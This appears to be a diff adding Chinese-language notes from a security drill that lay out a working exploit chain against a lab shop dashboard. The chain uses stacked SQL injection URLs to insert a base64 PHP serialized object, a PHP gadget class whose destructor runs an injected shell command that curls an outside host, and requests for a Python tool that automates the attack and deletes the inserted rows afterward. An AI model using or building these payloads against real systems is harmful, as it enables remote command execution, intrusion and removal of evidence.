@@ -1,0 +1,38 @@
+在資安攻防演練中，攻擊者漏洞利用流程如下：
+1. 將以下序列化資料，轉換成baes64編碼，加入步驟2中的網址進行sql injection，其中 curl http://192.168.139.133:8090 為想要在遠端主機執行的指令
+序列化資料：O:9:"ApiTester":2:{s:2:"ip";s:9:"127.0.0.1";s:14:"ApiTesterres";s:46:"' && curl http://192.168.139.133:8090 && echo'";}
+2. 使用以下網址進行sql injection插入資料
+網址：http://192.168.139.129/shop/dashboard/?page=product_info.php&id=1%3b+INSERT+INTO+products+(name,+description,+category,+price,+attributes)+VALUES('evil1',+'evil',+'evil',+0.00,+FROM_BASE64('Tzo5OiJBcGlUZXN0ZXIiOjI6e3M6MjoiaXAiO3M6OToiMTI3LjAuMC4xIjtzOjE0OiIAQXBpVGVzdGVyAHJlcyI7czo0NjoiJyAmJiBjdXJsIGh0dHA6Ly8xOTIuMTY4LjEzOS4xMzM6ODA5MCAmJiBlY2hvJyI7fQ=='))
+3. 使用以下網址檢索插入的資料，並觸發指令
+網址：http://192.168.139.129/shop/dashboard/?page=product_info.php&id=6
+
+最後將以上攻擊流程寫成一支程式自動化
+
+觸發指令後，使用sql injection刪除剛剛插入的資料
+
+如何將程式改成以下使用方式，-u 表示TARGET_URL 、 -c 表示REMOTE_CMD
+python.py -u http://192.168.139.129/shop/dashboard/ -c curl http://192.168.139.133:8090
+
+
+將步驟一的序列化資料改為以下php程式碼，並進行序列話與baes64編碼
+<?php
+class ApiTester {
+    public $ip;
+    private $res = "' && curl http://192.168.139.133:8090 && echo'";
+
+    public function __construct($ip) {
+        $this->ip = $ip;
+    }
+
+    public function __invoke() {
+        $this->res = system("ping " . $this->ip);
+    }
+
+    public function __destruct() {
+        system("echo '" . $this->res . "' > C:/logs/test.log");
+    }
+}
+
+
+如何使用python觸發以下網址，進行sql injection
+http://192.168.139.129/shop/dashboard/?page=product_info.php&id=1%3b+INSERT+INTO+products+(name,+description,+category,+price,+attributes)+VALUES('evil4',+'evil',+'evil',+0.00,+FROM_BASE64('Tzo5OiJBcGlUZXN0ZXIiOjI6e3M6MjoiaXAiO3M6OToiMTI3LjAuMC4xIjtzOjE4OiIlMDBBcGlUZXN0ZXIlMDByZXMiO3M6MzI6IicgJiYgY3VybCBodHRwOi8vMTkyLjE2OC4xMzkuMTMzOjgwOTAgJiYgZWNobyciO30='))
